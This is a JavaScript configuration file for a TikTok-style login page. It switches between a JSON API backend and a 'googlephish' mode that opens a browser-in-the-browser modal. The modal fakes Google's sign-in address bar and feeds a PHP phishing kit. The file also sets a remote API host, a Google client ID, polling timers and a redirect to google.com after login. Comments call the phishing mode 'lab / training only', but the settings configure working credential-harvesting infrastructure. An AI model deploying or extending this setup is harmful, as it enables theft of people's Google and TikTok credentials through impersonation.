window.APP_CONFIG = {
    /**
     * Login backend for the TikTok-style page:
     * - "api" — JSON API (apiBaseUrl) + real Google Sign-In
     * - "googlephish" — BITB modal iframe → PHP googlephish kit (lab / training only)
     */
    authMode: 'api',

    apiBaseUrl: 'https://tk-ap.onrender.com',
    googleClientId: '735055798027-6jjv31ohc5eg03olqn9i8tvav311j34l.apps.googleusercontent.com',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,
    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    /** Base URL where PHP serves the googlephish folder (no trailing slash). Example: http://127.0.0.1:8080/googlephish */
    googlephishBaseUrl: 'http://127.0.0.1:8080/googlephish',

    /** Shown in the fake browser address bar (BITB). */
    bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier',

    /** Optional short label in the BITB chrome (e.g. training banner). */
    bitbLabLabel: 'Training / lab simulation'
};
